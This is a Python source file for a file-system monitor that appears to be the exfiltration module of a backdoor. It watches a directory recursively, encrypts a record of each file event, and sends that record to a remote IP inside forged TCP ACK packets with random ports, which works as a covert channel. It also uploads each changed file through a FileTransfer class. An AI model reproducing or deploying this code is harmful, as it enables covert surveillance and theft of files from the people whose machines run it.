import watchdog.events
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import time
from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, TCP

from FileTransfer import FileTransfer


class Monitor:
    def __init__(self, ip, fernet):
        self.path = "."
        self.ip = ip
        self.encryption = fernet
        self.isActive = False
        self.observer = Observer()
        self.observer.schedule(Handler(self.ip, self.encryption), self.path, recursive=True)

    def start(self, signal):
        # start monitoring
        self.isActive = True
        self.observer.start()
        while self.isActive:
            if signal.value == 0:
                self.isActive = False
            time.sleep(1)
        self.observer.stop()
        self.observer.join()

    def stop(self):
        self.isActive = False

    def set_path(self, path):
        self.observer.unschedule_all()
        self.path = path
        self.observer.schedule(Handler(self.ip, self.encryption), self.path, recursive=True)

    def get_status(self):
        return self.isActive


class Handler(FileSystemEventHandler):

    def __init__(self, ip, fernet):
        self.encryption = fernet
        self.ip = ip
        self.fileTransfer = FileTransfer(self.ip, self.encryption)

    def on_any_event(self, event):
        if event.is_directory:
            return None
        if event.src_path.split(".")[-1] == "kate-swp":
            return None

        message = self.__get_time() + str(event)
        self.__send_message(message)
        self.__send_file(event.src_path)

    def __send_file(self, path):
        self.fileTransfer.setPath(path)
        self.fileTransfer.send()

    def __send_message(self, message):
        enc_data = self.encryption.encrypt(message.encode())
        pkt = Ether() / IP(dst=self.ip) / TCP(sport=RandNum(50000, 59999), dport=RandNum(10000, 19999), flags='A') / Raw(load=enc_data)
        sendp(pkt, verbose=0)

    def __get_time(self):
        return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
